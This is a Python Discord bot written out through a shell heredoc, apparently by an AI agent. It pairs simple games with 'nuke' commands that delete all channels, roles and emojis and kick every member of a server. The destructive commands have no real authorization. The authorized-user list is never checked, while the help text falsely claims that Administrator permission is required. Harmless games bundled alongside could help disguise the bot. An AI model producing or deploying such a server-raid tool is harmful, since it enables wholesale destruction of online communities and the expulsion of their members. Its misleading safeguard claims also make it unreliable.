cat > /home/claude/nuke_bot_final.py << 'ENDOFFILE'
import discord
from discord.ext import commands
from discord import app_commands
import asyncio
import os
import random

# ── Config ──────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN")
print(f"Token loaded: {BOT_TOKEN is not None}")
print(f"Token length: {len(BOT_TOKEN) if BOT_TOKEN else 0}")

# Only users with these IDs can run nuke commands
AUTHORIZED_USER_IDS = [
    933543370935128204,
]

# ── Bot Setup ────────────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


# ── Helpers ───────────────────────────────────────────────────────────────────
async def confirm(ctx, action: str) -> bool:
    embed = discord.Embed(
        title="⚠️ Confirm Nuke",
        description=f"Are you sure you want to **{action}**?\n\nType `yes` to confirm or `no` to cancel.",
        color=discord.Color.red(),
    )
    await ctx.send(embed=embed)

    def check(m):
        return m.author == ctx.author and m.channel == ctx.channel and m.content.lower() in ["yes", "no"]

    try:
        reply = await bot.wait_for("message", timeout=15.0, check=check)
        return reply.content.lower() == "yes"
    except asyncio.TimeoutError:
        await ctx.send("⏱️ Confirmation timed out. Nuke cancelled.")
        return False


async def send_result(ctx, results: list[str]):
    embed = discord.Embed(
        title="💥 Nuke Complete",
        description="\n".join(results),
        color=discord.Color.orange(),
    )
    await ctx.send(embed=embed)


# ── Nuke Commands ──────────────────────────────────────────────────────────────

@bot.command(name="nuke_channels")

async def nuke_channels(ctx):
    if not await confirm(ctx, "delete ALL channels"):
        return
    guild = ctx.guild
    count = 0
    for channel in guild.channels:
        try:
            await channel.delete(reason="Nuke: channels")
            count += 1
            await asyncio.sleep(0.5)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(f"💥 Nuke complete. Deleted **{count}** channels.")
    except Exception:
        pass


@bot.command(name="nuke_roles")

async def nuke_roles(ctx):
    if not await confirm(ctx, "delete all roles"):
        return
    guild = ctx.guild
    count = 0
    for role in guild.roles:
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: roles")
            count += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            pass
    await send_result(ctx, [f"🗑️ Deleted **{count}** roles."])


@bot.command(name="nuke_channels_roles")

async def nuke_channels_roles(ctx):
    if not await confirm(ctx, "delete all channels AND roles"):
        return
    guild = ctx.guild
    ch_count = role_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: channels+roles")
            ch_count += 1
            await asyncio.sleep(0.5)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: channels+roles")
            role_count += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(f"💥 Nuked **{ch_count}** channels and **{role_count}** roles.")
    except Exception:
        pass


@bot.command(name="nuke_kick")

async def nuke_kick(ctx):
    if not await confirm(ctx, "delete channels, roles, AND kick all members"):
        return
    guild = ctx.guild
    ch_count = role_count = kick_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: kick")
            ch_count += 1
            await asyncio.sleep(0.5)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: kick")
            role_count += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            pass
    async for member in guild.fetch_members(limit=None):
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Nuke: kick all")
            kick_count += 1
            await asyncio.sleep(0.5)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(
            f"💥 Nuked: **{ch_count}** channels, **{role_count}** roles, **{kick_count}** members kicked."
        )
    except Exception:
        pass


@bot.command(name="nuke_full")

async def nuke_full(ctx):
    if not await confirm(ctx, "FULL RESET — channels, roles, emojis, and kick all members"):
        return
    guild = ctx.guild
    ch_count = role_count = kick_count = emoji_count = 0
    for channel in list(guild.channels):
        try:
            await channel.delete(reason="Nuke: full reset")
            ch_count += 1
            await asyncio.sleep(0.5)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for role in list(guild.roles):
        if role.is_default() or role.managed:
            continue
        try:
            await role.delete(reason="Nuke: full reset")
            role_count += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            pass
    for emoji in list(guild.emojis):
        try:
            await emoji.delete(reason="Nuke: full reset")
            emoji_count += 1
            await asyncio.sleep(0.3)
        except (discord.Forbidden, discord.HTTPException):
            pass
    async for member in guild.fetch_members(limit=None):
        if member == ctx.author:
            continue
        try:
            await member.kick(reason="Nuke: full reset")
            kick_count += 1
            await asyncio.sleep(0.5)
        except (discord.Forbidden, discord.HTTPException):
            pass
    try:
        new_ch = await guild.create_text_channel("general")
        await new_ch.send(
            f"💥 **Full Nuke Complete**\n"
            f"🗑️ Channels: {ch_count}\n"
            f"🎭 Roles: {role_count}\n"
            f"😀 Emojis: {emoji_count}\n"
            f"👢 Members kicked: {kick_count}"
        )
    except Exception:
        pass


@bot.command(name="nuke_help")
async def nuke_help(ctx):
    embed = discord.Embed(title="💥 Nuke Bot Commands", color=discord.Color.red())
    embed.add_field(name="!nuke_channels", value="Delete all channels", inline=False)
    embed.add_field(name="!nuke_roles", value="Delete all non-default roles", inline=False)
    embed.add_field(name="!nuke_channels_roles", value="Delete all channels and roles", inline=False)
    embed.add_field(name="!nuke_kick", value="Delete channels, roles, and kick all members", inline=False)
    embed.add_field(name="!nuke_full", value="Full reset: channels, roles, emojis, kick members", inline=False)
    embed.set_footer(text="⚠️ Requires Administrator permission. All actions ask for confirmation.")
    await ctx.send(embed=embed)


# ══════════════════════════════════════════════════════════════════════════════
# 🎮 SLASH COMMAND GAMES
# ══════════════════════════════════════════════════════════════════════════════

# ── 🎰 Slots ──────────────────────────────────────────────────────────────────
@tree.command(name="slots", description="Spin the slot machine!")
async def slots(interaction: discord.Interaction):
    symbols = ["🍒", "🍋", "🍊", "🍇", "⭐", "💎", "7️⃣"]
    reels = [random.choice(symbols) for _ in range(3)]
    result = " | ".join(reels)

    if reels[0] == reels[1] == reels[2]:
        if reels[0] == "💎":
            outcome = "💰 JACKPOT! You hit diamonds!"
            color = discord.Color.gold()
        elif reels[0] == "7️⃣":
            outcome = "🎉 TRIPLE 7s! Massive win!"
            color = discord.Color.gold()
        else:
            outcome = "🎊 You win! Three of a kind!"
            color = discord.Color.green()
    elif reels[0] == reels[1] or reels[1] == reels[2] or reels[0] == reels[2]:
        outcome = "😐 Two of a kind. Almost there!"
        color = discord.Color.yellow()
    else:
        outcome = "❌ No match. Better luck next time!"
        color = discord.Color.red()

    embed = discord.Embed(title="🎰 Slot Machine", description=f"**{result}**\n\n{outcome}", color=color)
    await interaction.response.send_message(embed=embed)


# ── 🪨 Rock Paper Scissors ────────────────────────────────────────────────────
@tree.command(name="rps", description="Play Rock Paper Scissors!")
@app_commands.describe(choice="Your choice: rock, paper, or scissors")
@app_commands.choices(choice=[
    app_commands.Choice(name="Rock 🪨", value="rock"),
    app_commands.Choice(name="Paper 📄", value="paper"),
    app_commands.Choice(name="Scissors ✂️", value="scissors"),
])
async def rps(interaction: discord.Interaction, choice: str):
    options = ["rock", "paper", "scissors"]
    emojis = {"rock": "🪨", "paper": "📄", "scissors": "✂️"}
    bot_choice = random.choice(options)

    if choice == bot_choice:
        result = "🤝 It's a tie!"
        color = discord.Color.yellow()
    elif (choice == "rock" and bot_choice == "scissors") or \
         (choice == "paper" and bot_choice == "rock") or \
         (choice == "scissors" and bot_choice == "paper"):
        result = "🎉 You win!"
        color = discord.Color.green()
    else:
        result = "❌ You lose!"
        color = discord.Color.red()

    embed = discord.Embed(title="🪨 Rock Paper Scissors", color=color)
    embed.add_field(name="Your choice", value=emojis[choice], inline=True)
    embed.add_field(name="Bot's choice", value=emojis[bot_choice], inline=True)
    embed.add_field(name="Result", value=result, inline=False)
    await interaction.response.send_message(embed=embed)


# ── 🎱 8 Ball ─────────────────────────────────────────────────────────────────
@tree.command(name="8ball", description="Ask the magic 8 ball a question!")
@app_commands.describe(question="Your yes/no question")
async def eightball(interaction: discord.Interaction, question: str):
    responses = [
        "✅ It is certain.", "✅ It is decidedly so.", "✅ Without a doubt.",
        "✅ Yes, definitely.", "✅ You may rely on it.", "✅ As I see it, yes.",
        "✅ Most likely.", "✅ Outlook good.", "✅ Yes.", "✅ Signs point to yes.",
        "🤷 Reply hazy, try again.", "🤷 Ask again later.", "🤷 Better not tell you now.",
        "🤷 Cannot predict now.", "🤷 Concentrate and ask again.",
        "❌ Don't count on it.", "❌ My reply is no.", "❌ My sources say no.",
        "❌ Outlook not so good.", "❌ Very doubtful."
    ]
    answer = random.choice(responses)
    embed = discord.Embed(title="🎱 Magic 8 Ball", color=discord.Color.dark_purple())
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    await interaction.response.send_message(embed=embed)


# ── 🎲 Dice Roll ──────────────────────────────────────────────────────────────
@tree.command(name="dice", description="Roll a dice!")
@app_commands.describe(sides="Number of sides on the dice (default: 6)")
async def dice(interaction: discord.Interaction, sides: int = 6):
    if sides < 2:
        await interaction.response.send_message("❌ A dice needs at least 2 sides!", ephemeral=True)
        return
    result = random.randint(1, sides)
    embed = discord.Embed(
        title="🎲 Dice Roll",
        description=f"You rolled a **d{sides}** and got... **{result}**!",
        color=discord.Color.blue()
    )
    await interaction.response.send_message(embed=embed)


# ── ❓ Trivia ─────────────────────────────────────────────────────────────────
TRIVIA_QUESTIONS = [
    {"q": "What is the capital of France?", "a": "paris"},
    {"q": "How many sides does a hexagon have?", "a": "6"},
    {"q": "What is the largest planet in our solar system?", "a": "jupiter"},
    {"q": "What is 7 x 8?", "a": "56"},
    {"q": "What color is the sky on a clear day?", "a": "blue"},
    {"q": "What is the chemical symbol for water?", "a": "h2o"},
    {"q": "How many continents are there?", "a": "7"},
    {"q": "What is the fastest land animal?", "a": "cheetah"},
    {"q": "How many legs does a spider have?", "a": "8"},
    {"q": "What planet is known as the Red Planet?", "a": "mars"},
]

@tree.command(name="trivia", description="Answer a trivia question!")
async def trivia(interaction: discord.Interaction):
    q = random.choice(TRIVIA_QUESTIONS)
    embed = discord.Embed(
        title="❓ Trivia Time!",
        description=q["q"],
        color=discord.Color.teal()
    )
    embed.set_footer(text="You have 15 seconds to answer in chat!")
    await interaction.response.send_message(embed=embed)

    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel

    try:
        msg = await bot.wait_for("message", timeout=15.0, check=check)
        if msg.content.lower().strip() == q["a"]:
            await interaction.channel.send(f"✅ Correct, {interaction.user.mention}! The answer was **{q['a']}**!")
        else:
            await interaction.channel.send(f"❌ Wrong! The correct answer was **{q['a']}**.")
    except asyncio.TimeoutError:
        await interaction.channel.send(f"⏱️ Time's up! The answer was **{q['a']}**.")


# ── 🃏 Blackjack ──────────────────────────────────────────────────────────────
def draw_card():
    cards = ["2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K", "A"]
    return random.choice(cards)

def card_value(card):
    if card in ["J", "Q", "K"]:
        return 10
    elif card == "A":
        return 11
    return int(card)

def hand_value(hand):
    total = sum(card_value(c) for c in hand)
    aces = hand.count("A")
    while total > 21 and aces:
        total -= 10
        aces -= 1
    return total

@tree.command(name="blackjack", description="Play a game of Blackjack!")
async def blackjack(interaction: discord.Interaction):
    player = [draw_card(), draw_card()]
    dealer = [draw_card(), draw_card()]

    def hand_str(hand):
        return " ".join(hand)

    embed = discord.Embed(title="🃏 Blackjack", color=discord.Color.dark_green())
    embed.add_field(name="Your hand", value=f"{hand_str(player)} (Total: {hand_value(player)})", inline=False)
    embed.add_field(name="Dealer's hand", value=f"{dealer[0]} ❓", inline=False)
    embed.set_footer(text="Type 'hit' to draw a card or 'stand' to hold.")
    await interaction.response.send_message(embed=embed)

    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel and m.content.lower() in ["hit", "stand"]

    while hand_value(player) < 21:
        try:
            msg = await bot.wait_for("message", timeout=30.0, check=check)
        except asyncio.TimeoutError:
            await interaction.channel.send("⏱️ Game timed out!")
            return

        if msg.content.lower() == "hit":
            player.append(draw_card())
            if hand_value(player) > 21:
                await interaction.channel.send(
                    f"💥 Bust! Your hand: {hand_str(player)} ({hand_value(player)}). You lose!"
                )
                return
            await interaction.channel.send(
                f"Your hand: {hand_str(player)} (Total: {hand_value(player)})\nType 'hit' or 'stand'."
            )
        else:
            break

    # Dealer's turn
    while hand_value(dealer) < 17:
        dealer.append(draw_card())

    p = hand_value(player)
    d = hand_value(dealer)

    result_embed = discord.Embed(title="🃏 Blackjack Result", color=discord.Color.dark_green())
    result_embed.add_field(name="Your hand", value=f"{hand_str(player)} ({p})", inline=True)
    result_embed.add_field(name="Dealer's hand", value=f"{hand_str(dealer)} ({d})", inline=True)

    if d > 21 or p > d:
        result_embed.add_field(name="Result", value="🎉 You win!", inline=False)
    elif p == d:
        result_embed.add_field(name="Result", value="🤝 It's a tie!", inline=False)
    else:
        result_embed.add_field(name="Result", value="❌ Dealer wins!", inline=False)

    await interaction.channel.send(embed=result_embed)


# ── 💣 Minesweeper ────────────────────────────────────────────────────────────
@tree.command(name="minesweeper", description="Generate a minesweeper board!")
@app_commands.describe(size="Board size (default: 5)", mines="Number of mines (default: 5)")
async def minesweeper(interaction: discord.Interaction, size: int = 5, mines: int = 5):
    if size < 3 or size > 8:
        await interaction.response.send_message("❌ Size must be between 3 and 8!", ephemeral=True)
        return
    if mines >= size * size:
        await interaction.response.send_message("❌ Too many mines for this board size!", ephemeral=True)
        return

    # Place mines
    board = [[0] * size for _ in range(size)]
    mine_positions = random.sample(range(size * size), mines)
    for pos in mine_positions:
        board[pos // size][pos % size] = -1

    # Calculate numbers
    for r in range(size):
        for c in range(size):
            if board[r][c] == -1:
                continue
            count = 0
            for dr in [-1, 0, 1]:
                for dc in [-1, 0, 1]:
                    nr, nc = r + dr, c + dc
                    if 0 <= nr < size and 0 <= nc < size and board[nr][nc] == -1:
                        count += 1
            board[r][c] = count

    # Build spoiler board
    number_emojis = ["0️⃣", "1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣"]
    rows = []
    for r in range(size):
        row = ""
        for c in range(size):
            if board[r][c] == -1:
                row += "||💣||"
            else:
                row += f"||{number_emojis[board[r][c]]}||"
        rows.append(row)

    board_str = "\n".join(rows)
    embed = discord.Embed(
        title="💣 Minesweeper",
        description=f"**{size}x{size} board with {mines} mines!**\nClick the spoilers to reveal cells!\n\n{board_str}",
        color=discord.Color.greyple()
    )
    await interaction.response.send_message(embed=embed)


# ── Error Handling ────────────────────────────────────────────────────────────
@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("🚫 You don't have permission to use this command.")
    elif isinstance(error, commands.CommandNotFound):
        pass
    else:
        await ctx.send(f"❌ Error: {error}")


# ── Ready ─────────────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    await tree.sync()
    print(f"✅ Logged in as {bot.user} ({bot.user.id})")
    print("Nuke bot ready.")


bot.run(BOT_TOKEN)
